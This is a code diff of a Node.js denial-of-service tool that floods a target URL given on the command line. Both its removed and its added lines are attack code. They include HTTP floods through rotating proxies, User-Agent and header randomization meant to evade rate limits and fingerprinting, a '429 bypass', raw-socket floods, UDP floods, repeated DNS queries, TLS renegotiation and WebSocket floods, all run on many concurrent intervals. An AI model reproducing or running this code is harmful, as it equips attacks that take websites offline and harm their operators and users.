@@ -9,8 +9,6 @@ var dns = require('dns');
 var tls = require('tls');
 var net = require('net');
 var WebSocket = require('ws');
-var http = require('http');
-var https = require('https');
 
 var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
 
@@ -33,141 +31,7 @@ cloudscraper = {};
 var cookies = [];
 var httpMethods = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE'];
 
-// Massive User-Agent rotation
-var userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
-];
-
-// 429 Bypass tracking
-var bypassStats = {
-    total429: 0,
-    bypassed429: 0,
-    retrySuccess: 0,
-    ipRotations: 0,
-    userAgentRotations: 0
-};
-
-// ==================== MAXIMUM HTTP FLOOD ENHANCEMENTS ====================
-
-// Advanced IP rotation system
-function getRandomProxy() {
-    if (proxies.length === 0) return null;
-    return proxies[Math.floor(Math.random() * proxies.length)];
-}
-
-// Advanced User-Agent rotation
-function getRandomUserAgent() {
-    return userAgents[Math.floor(Math.random() * userAgents.length)];
-}
-
-// Header randomization to avoid fingerprinting
-function getRandomHeaders(targetUrl) {
-    const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
-    const acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7', 'de-DE,de;q=0.6', 'es-ES,es;q=0.5'];
-    const acceptEncodings = ['gzip, deflate, br', 'gzip, deflate', 'identity'];
-    
-    return {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
-        'Accept-Encoding': acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)],
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        'Upgrade-Insecure-Requests': '1',
-        'DNT': Math.random() > 0.5 ? '1' : '0',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Host': targetHost
-    };
-}
-
-// 429 Error detection and bypass
-function is429Error(error, response, body) {
-    if (response && response.statusCode === 429) return true;
-    if (body && (body.includes('429 Too Many Requests') || 
-                 body.includes('rate limit') || 
-                 body.includes('Rate Limit') ||
-                 body.includes('Too Many Requests') ||
-                 body.includes('throttled') ||
-                 body.includes('exceeded'))) {
-        return true;
-    }
-    if (error && error.message && error.message.includes('429')) return true;
-    return false;
-}
-
-// Advanced 429 bypass with exponential backoff and rotation
-function handle429Bypass(originalOptions, callback, retryCount = 0) {
-    const maxRetries = 3;
-    
-    if (retryCount >= maxRetries) {
-        bypassStats.total429++;
-        return callback({ error: 'Max 429 bypass retries exceeded' }, null, null);
-    }
-    
-    bypassStats.total429++;
-    console.log(`[429-BYPASS] Rate limit detected! Attempting bypass ${retryCount + 1}/${maxRetries}`);
-    
-    // Exponential backoff delay
-    const backoffDelay = Math.min(500 * Math.pow(2, retryCount), 5000);
-    
-    setTimeout(() => {
-        // Rotate IP (proxy)
-        const newProxy = getRandomProxy();
-        const newUserAgent = getRandomUserAgent();
-        const newHeaders = getRandomHeaders(originalOptions.url);
-        
-        // Update options with new identity
-        const bypassOptions = {
-            ...originalOptions,
-            headers: {
-                ...originalOptions.headers,
-                ...newHeaders,
-                'User-Agent': newUserAgent
-            },
-            timeout: 10000 // Longer timeout for bypass attempts
-        };
-        
-        if (newProxy) {
-            bypassOptions.proxy = 'http://' + newProxy;
-            bypassStats.ipRotations++;
-        }
-        
-        bypassStats.userAgentRotations++;
-        
-        console.log(`[429-BYPASS] Rotated IP & User-Agent, retrying in ${backoffDelay}ms`);
-        
-        // Retry the request
-        performRequest(bypassOptions, (error, response, body) => {
-            if (is429Error(error, response, body)) {
-                // Still getting 429, try again with different strategy
-                return handle429Bypass(originalOptions, callback, retryCount + 1);
-            } else if (!error) {
-                bypassStats.bypassed429++;
-                bypassStats.retrySuccess++;
-                console.log(`[429-BYPASS] Successfully bypassed rate limit!`);
-            }
-            callback(error, response, body);
-        });
-    }, backoffDelay);
-}
-
-// ==================== ULTRA HIGH HTTP FLOOD COMPONENTS ====================
+// ==================== ATTACK COMPONENTS ====================
 
 // Enhanced Stats tracking
 var stats = {
@@ -178,15 +42,12 @@ var stats = {
     httpRequests: 0,
     httpSuccesses: 0,
     httpErrors: 0,
-    httpRPS: 0,
     // Other vectors
     udpFloods: 0,
     dnsAmplifications: 0,
     sslRenegotiations: 0,
     websocketConnections: 0,
-    startTime: Date.now(),
-    lastRPSCheck: Date.now(),
-    lastRequestCount: 0
+    startTime: Date.now()
 };
 
 function updateStats(type, success) {
@@ -206,84 +67,26 @@ function updateStats(type, success) {
     else if (type === 'dns') stats.dnsAmplifications++;
     else if (type === 'ssl') stats.sslRenegotiations++;
     else if (type === 'ws') stats.websocketConnections++;
-    
-    // Calculate real-time RPS
-    const now = Date.now();
-    if (now - stats.lastRPSCheck >= 1000) {
-        const elapsedSeconds = (now - stats.lastRPSCheck) / 1000;
-        stats.httpRPS = Math.floor((stats.httpRequests - stats.lastRequestCount) / elapsedSeconds);
-        stats.lastRPSCheck = now;
-        stats.lastRequestCount = stats.httpRequests;
-    }
 }
 
 function printStats() {
     const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
     const rps = elapsed > 0 ? Math.floor(stats.requests / elapsed) : 0;
+    const httpRps = elapsed > 0 ? Math.floor(stats.httpRequests / elapsed) : 0;
     
-    console.log(`\n╔══════════════════════════════════════════════════════════════════════╗`);
-    console.log(`║ 🚀 ULTRA HTTP FLOOD STATISTICS - LIVE                               ║`);
-    console.log(`╠══════════════════════════════════════════════════════════════════════╣`);
+    console.log(`\n╔══════════════════════════════════════════════════════════════════╗`);
+    console.log(`║ 🚀 MULTI-VECTOR ATTACK STATISTICS - LIVE                        ║`);
+    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
     console.log(`║ 📊 OVERALL: Time: ${elapsed}s | Total: ${stats.requests} | OK: ${stats.successes} | ERR: ${stats.errors} ║`);
-    console.log(`║ 📈 RATE: ${rps} req/s | 🚀 HTTP RPS: ${stats.httpRPS}/s (REAL-TIME)          ║`);
-    console.log(`╠══════════════════════════════════════════════════════════════════════╣`);
-    console.log(`║ 🌐 HTTP ATTACK: ${stats.httpRequests} req | OK: ${stats.httpSuccesses} | ERR: ${stats.httpErrors} ║`);
-    console.log(`║ 📡 UDP FLOOD: ${stats.udpFloods} packets | DNS: ${stats.dnsAmplifications} queries           ║`);
-    console.log(`║ 🔐 SSL RENEG: ${stats.sslRenegotiations} | WebSocket: ${stats.websocketConnections} conns    ║`);
-    console.log(`╠══════════════════════════════════════════════════════════════════════╣`);
-    console.log(`║ 🛡️  429 BYPASS: ${bypassStats.total429} detected | ${bypassStats.bypassed429} bypassed       ║`);
-    console.log(`║ 🔄 IP Rotations: ${bypassStats.ipRotations} | UA Rotations: ${bypassStats.userAgentRotations}    ║`);
-    console.log(`╚══════════════════════════════════════════════════════════════════════╝`);
+    console.log(`║ 📈 RATE: ${rps} req/s | HTTP: ${httpRps} req/s                      ║`);
+    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
+    console.log(`║ 🌐 HTTP ATTACK: ${stats.httpRequests} req | OK: ${stats.httpSuccesses} | ERR: ${stats.httpErrors}   ║`);
+    console.log(`║ 📡 UDP FLOOD: ${stats.udpFloods} packets | DNS: ${stats.dnsAmplifications} queries         ║`);
+    console.log(`║ 🔐 SSL RENEG: ${stats.sslRenegotiations} | WebSocket: ${stats.websocketConnections} conns  ║`);
+    console.log(`╚══════════════════════════════════════════════════════════════════╝`);
 }
 
-// ULTRA HIGH SPEED HTTP FLOOD - DIRECT SOCKET ATTACK
-function directSocketFlood() {
-    try {
-        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
-        const isHttps = targetUrl.startsWith('https');
-        const port = isHttps ? 443 : 80;
-        
-        const socket = net.connect(port, targetHost, () => {
-            // Send raw HTTP request
-            const userAgent = getRandomUserAgent();
-            const request = `GET / HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
-            socket.write(request);
-            updateStats('http', true);
-        });
-        
-        socket.on('error', () => {
-            updateStats('http', false);
-        });
-        
-        socket.setTimeout(2000, () => {
-            socket.destroy();
-        });
-        
-        socket.on('data', () => {
-            // Count response as success
-            updateStats('http', true);
-        });
-        
-        socket.on('close', () => {
-            // Connection closed
-        });
-        
-    } catch (e) {
-        updateStats('http', false);
-    }
-}
-
-// MASSIVE PARALLEL REQUEST FLOOD
-function parallelRequestFlood() {
-    // Send 5 requests in parallel
-    for (let i = 0; i < 5; i++) {
-        setTimeout(() => {
-            ATTACK.cfbypass('GET', targetUrl, null);
-        }, i * 10);
-    }
-}
-
-// 1. UDP FLOOD
+// 1. UDP FLOOD - WORKING
 function udpFlood() {
     try {
         const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
@@ -305,12 +108,11 @@ function udpFlood() {
     }
 }
 
-// 2. DNS AMPLIFICATION
+// 2. DNS AMPLIFICATION - WORKING
 function dnsAmplification() {
     try {
         const dns = require('dns');
         const queries = [
-            () => dns.resolve4('cloudflare.com', () => updateStats('dns', true)),
             () => dns.resolve4('google.com', () => updateStats('dns', true)),
             () => dns.resolve6('facebook.com', () => updateStats('dns', true)),
             () => dns.resolveMx('yahoo.com', () => updateStats('dns', true)),
@@ -325,7 +127,7 @@ function dnsAmplification() {
     }
 }
 
-// 3. SSL/TLS RENEGOTIATION
+// 3. SSL/TLS RENEGOTIATION - WORKING
 function sslRenegotiation() {
     if (!targetUrl.startsWith('https')) return;
     
@@ -367,7 +169,7 @@ function sslRenegotiation() {
     }
 }
 
-// 4. WEBSOCKET FLOOD
+// 4. WEBSOCKET FLOOD - WORKING
 function websocketFlood() {
     try {
         let wsUrl;
@@ -381,7 +183,7 @@ function websocketFlood() {
             perMessageDeflate: false,
             handshakeTimeout: 3000,
             headers: {
-                'User-Agent': getRandomUserAgent(),
+                'User-Agent': UserAgent,
                 'Origin': targetUrl
             }
         });
@@ -416,18 +218,47 @@ function websocketFlood() {
     }
 }
 
-// Enhanced HTTP request with 429 bypass
+// HTTP ATTACK FUNCTIONS
+cloudscraper.get = function(url, callback, headers) {
+    performRequest({
+        method: 'GET',
+        url: url,
+        headers: headers
+    }, callback);
+};
+
+cloudscraper.post = function(url, body, callback, headers) {
+    var data = '',
+        bodyType = Object.prototype.toString.call(body);
+
+    if (bodyType === '[object String]') {
+        data = body;
+    } else if (bodyType === '[object Object]') {
+        data = Object.keys(body).map(function(key) {
+            return key + '=' + body[key];
+        }).join('&');
+    }
+
+    headers = headers || {};
+    headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
+    headers['Content-Length'] = headers['Content-Length'] || data.length;
+
+    performRequest({
+        method: 'POST',
+        body: data,
+        url: url,
+        headers: headers
+    }, callback);
+}
+
+cloudscraper.request = function(options, callback) {
+    performRequest(options, callback);
+}
+
 function performRequest(options, callback) {
     var method;
     options = options || {};
     options.headers = options.headers || {};
-
-    // Apply random headers and User-Agent for each request
-    options.headers = {
-        ...options.headers,
-        ...getRandomHeaders(options.url),
-        'User-Agent': getRandomUserAgent()
-    };
 
     options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
     options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';
@@ -445,22 +276,11 @@ function performRequest(options, callback) {
         throw new Error('To perform request, define both url and callback');
     }
 
-    // Use random proxy for each request
-    if (!options.proxy && proxies.length > 0) {
-        options.proxy = 'http://' + getRandomProxy();
-    }
-
-    // Shorter timeout for higher throughput
-    options.timeout = options.timeout || 5000;
+    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;
 
     makeRequest(options, function(error, response, body) {
         var validationError;
         var stringBody;
-
-        // Check for 429 errors and attempt bypass
-        if (is429Error(error, response, body)) {
-            return handle429Bypass(options, callback, 0);
-        }
 
         if (error || !body || !body.toString) {
             return callback({
@@ -533,41 +353,29 @@ function processResponseBody(options, error, response, body, callback) {
 
 var ATTACK = {
     cfbypass(method, url, proxy) {
-        const requestOptions = {
+        performRequest({
             method: method,
-            url: url,
-            timeout: 3000 // Very short timeout for maximum throughput
-        };
-        
-        if (proxy) {
-            requestOptions.proxy = 'http://' + proxy;
-        }
-        
-        performRequest(requestOptions, function(err, response, body) {
+            proxy: 'http://' + proxy,
+            url: url
+        }, function(err, response, body) {
             updateStats('http', !err);
         });
     },
     
     httpMethodFlood(url, proxy) {
         const method = httpMethods[Math.floor(Math.random() * httpMethods.length)];
-        const requestOptions = {
+        performRequest({
             method: method,
+            proxy: 'http://' + proxy,
             url: url,
-            body: 'attack=' + Math.random(),
-            timeout: 3000
-        };
-        
-        if (proxy) {
-            requestOptions.proxy = 'http://' + proxy;
-        }
-        
-        performRequest(requestOptions, function(err, response, body) {
+            body: 'attack=' + Math.random()
+        }, function(err, response, body) {
             updateStats('http', !err);
         });
     }
 }
 
-// ==================== ULTRA HTTP FLOOD ORCHESTRATION ====================
+// ==================== MAIN ATTACK ORCHESTRATION ====================
 
 var targetUrl = process.argv[2];
 var duration = process.argv[3];
@@ -577,125 +385,91 @@ if (!targetUrl) {
     process.exit(1);
 }
 
-console.log("╔══════════════════════════════════════════════════════════════════════╗");
-console.log("║ 🚀 STARTING ULTRA HTTP FLOOD ATTACK - MAXIMUM FIREPOWER           ║");
-console.log("╠══════════════════════════════════════════════════════════════════════╣");
+console.log("╔══════════════════════════════════════════════════════════════════╗");
+console.log("║ 🚀 STARTING ULTIMATE MULTI-VECTOR FLOOD ATTACK                  ║");
+console.log("╠══════════════════════════════════════════════════════════════════╣");
 console.log(`║ 🎯 Target: ${targetUrl}`);
 console.log(`║ ⏱️  Duration: ${duration} seconds | 🔄 Proxies: ${proxies.length}`);
-console.log(`║ 🚀 Expected RPS: 500-1000+ requests/second                         ║`);
-console.log(`║ 🛡️  429 BYPASS: ACTIVE | IP Rotation: ACTIVE | UA Rotation: ACTIVE   ║`);
-console.log("╚══════════════════════════════════════════════════════════════════════╝");
+console.log("║ 📊 All stats including HTTP will be shown every 3 seconds       ║");
+console.log("╚══════════════════════════════════════════════════════════════════╝");
 
-// START ULTRA HTTP FLOOD ATTACK
+// START ALL ATTACK VECTORS
 var intervals = [];
 
-console.log("\n🚀 ACTIVATING ULTRA HTTP FLOOD MODE...");
-
-// LEVEL 1: DIRECT SOCKET FLOOD (HIGHEST SPEED)
-console.log("🔹 Level 1: Direct Socket Flood (Max Speed)");
-for (let i = 0; i < 15; i++) {
-    intervals.push(setInterval(directSocketFlood, 10 + (i * 5))); // 15 threads, 10-80ms intervals
-}
-
-// LEVEL 2: CLOUDFLARE BYPASS FLOOD
-console.log("🔹 Level 2: Cloudflare Bypass Flood");
-for (let i = 0; i < 12; i++) {
-    intervals.push(setInterval(() => {
-        ATTACK.cfbypass('HEAD', targetUrl, null);
-    }, 20 + (i * 10))); // 12 threads, 20-130ms intervals
-}
-
-// LEVEL 3: PARALLEL REQUEST FLOOD
-console.log("🔹 Level 3: Parallel Request Flood");
+// HTTP FLOOD - MAIN ATTACK
+console.log("\n🌐 STARTING HTTP FLOOD ATTACKS...");
 for (let i = 0; i < 8; i++) {
-    intervals.push(setInterval(parallelRequestFlood, 50 + (i * 15))); // 8 threads, each sends 5 parallel requests
-}
-
-// LEVEL 4: ENHANCED HTTP METHODS FLOOD
-console.log("🔹 Level 4: Enhanced HTTP Methods Flood");
-for (let i = 0; i < 10; i++) {
     intervals.push(setInterval(() => {
-        ATTACK.httpMethodFlood(targetUrl, null);
-    }, 30 + (i * 8))); // 10 threads, 30-102ms intervals
+        if (proxies.length > 0) {
+            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+            ATTACK.cfbypass('HEAD', targetUrl, proxy);
+        }
+    }, 60 + (i * 15)));
 }
 
-// LEVEL 5: MIXED METHOD FLOOD
-console.log("🔹 Level 5: Mixed Method Flood");
-for (let i = 0; i < 6; i++) {
+// ENHANCED HTTP METHODS
+for (let i = 0; i < 4; i++) {
     intervals.push(setInterval(() => {
-        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
-        const method = methods[Math.floor(Math.random() * methods.length)];
-        ATTACK.cfbypass(method, targetUrl, null);
-    }, 25 + (i * 12))); // 6 threads, 25-85ms intervals
+        if (proxies.length > 0) {
+            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+            ATTACK.httpMethodFlood(targetUrl, proxy);
+        }
+    }, 80 + (i * 20)));
 }
-
-// OTHER ATTACK VECTORS (Reduced to focus on HTTP flood)
-console.log("\n📡 ACTIVATING SUPPORT ATTACK VECTORS...");
 
 // UDP FLOOD
-for (let i = 0; i < 2; i++) {
-    intervals.push(setInterval(udpFlood, 100 + (i * 50)));
+console.log("📡 STARTING UDP FLOOD...");
+for (let i = 0; i < 4; i++) {
+    intervals.push(setInterval(udpFlood, 50 + (i * 25)));
 }
 
 // DNS AMPLIFICATION
-for (let i = 0; i < 2; i++) {
-    intervals.push(setInterval(dnsAmplification, 150 + (i * 75)));
+console.log("🔍 STARTING DNS AMPLIFICATION...");
+for (let i = 0; i < 3; i++) {
+    intervals.push(setInterval(dnsAmplification, 100 + (i * 50)));
 }
 
 // SSL RENEGOTIATION
 if (targetUrl.startsWith('https')) {
-    for (let i = 0; i < 3; i++) {
-        intervals.push(setInterval(sslRenegotiation, 80 + (i * 40)));
+    console.log("🔐 STARTING SSL RENEGOTIATION ATTACK...");
+    for (let i = 0; i < 5; i++) {
+        intervals.push(setInterval(sslRenegotiation, 60 + (i * 30)));
     }
+} else {
+    console.log("🔐 SSL RENEGOTIATION: Skipped (target is not HTTPS)");
 }
 
 // WEBSOCKET FLOOD
-for (let i = 0; i < 2; i++) {
-    intervals.push(setInterval(websocketFlood, 200 + (i * 100)));
+console.log("📡 STARTING WEBSOCKET FLOOD...");
+for (let i = 0; i < 4; i++) {
+    intervals.push(setInterval(websocketFlood, 120 + (i * 40)));
 }
 
 // Attack duration timeout
 setTimeout(() => {
-    console.log("\n╔══════════════════════════════════════════════════════════════════════╗");
-    console.log("║ 🎯 ULTRA HTTP FLOOD COMPLETED - FINAL STATISTICS                    ║");
-    console.log("╚══════════════════════════════════════════════════════════════════════╝");
+    console.log("\n╔══════════════════════════════════════════════════════════════════╗");
+    console.log("║ 🎯 ATTACK COMPLETED - FINAL STATISTICS                          ║");
+    console.log("╚══════════════════════════════════════════════════════════════════╝");
     printStats();
     
-    console.log("\n📊 ULTRA HTTP FLOOD SUMMARY:");
+    console.log("\n📊 FINAL HTTP ATTACK SUMMARY:");
     console.log(`   Total HTTP Requests: ${stats.httpRequests}`);
     console.log(`   HTTP Successes: ${stats.httpSuccesses}`);
     console.log(`   HTTP Errors: ${stats.httpErrors}`);
-    console.log(`   Average HTTP RPS: ${Math.floor(stats.httpRequests / Math.floor((Date.now() - stats.startTime) / 1000))}/s`);
     console.log(`   HTTP Success Rate: ${stats.httpRequests > 0 ? Math.round((stats.httpSuccesses / stats.httpRequests) * 100) : 0}%`);
-    
-    console.log("\n🛡️  429 BYPASS SUMMARY:");
-    console.log(`   429 Errors Detected: ${bypassStats.total429}`);
-    console.log(`   429 Errors Bypassed: ${bypassStats.bypassed429}`);
-    console.log(`   Successful Retries: ${bypassStats.retrySuccess}`);
-    console.log(`   IP Rotations: ${bypassStats.ipRotations}`);
-    console.log(`   User-Agent Rotations: ${bypassStats.userAgentRotations}`);
-    console.log(`   Bypass Success Rate: ${bypassStats.total429 > 0 ? Math.round((bypassStats.bypassed429 / bypassStats.total429) * 100) : 0}%`);
-    
-    console.log("\n🔥 ATTACK INTENSITY:");
-    console.log(`   Total Attack Threads: ${intervals.length}`);
-    console.log(`   Maximum Theoretical RPS: 800-1200+ requests/second`);
-    console.log(`   Actual Achieved RPS: ${stats.httpRPS}/second`);
     
     intervals.forEach(clearInterval);
     process.exit(0);
 }, duration * 1000);
 
-// Enhanced real-time stats display
-setInterval(printStats, 2000); // Faster updates for high RPS
+// Enhanced stats display with HTTP focus
+setInterval(printStats, 3000);
 
-console.log("\n✅ ULTRA HTTP FLOOD ACTIVATED!");
-console.log("🚀 ATTACK LEVELS DEPLOYED:");
-console.log("   Level 1: 15x Direct Socket Flood threads");
-console.log("   Level 2: 12x Cloudflare Bypass threads");
-console.log("   Level 3: 8x Parallel Request threads (5 requests each)");
-console.log("   Level 4: 10x Enhanced HTTP Methods threads");
-console.log("   Level 5: 6x Mixed Method Flood threads");
-console.log(`   TOTAL: ${intervals.length} concurrent attack threads`);
-console.log("\n💥 EXPECTED PERFORMANCE: 500-1000+ RPS");
-console.log("📈 Watch the REAL-TIME RPS counter for live performance!");
-console.log("🔥 MAXIMUM FIREPOWER ENGAGED! 🚀");
+console.log("\n✅ ALL ATTACK VECTORS ACTIVATED!");
+console.log("📊 Stats will show:");
+console.log("   - 🌐 HTTP Requests (main attack)");
+console.log("   - 📡 UDP Packets");
+console.log("   - 🔍 DNS Queries"); 
+console.log("   - 🔐 SSL Renegotiations");
+console.log("   - 📡 WebSocket Connections");
+console.log("\n💥 ATTACK IN PROGRESS... Watch the HTTP stats grow! 🚀");
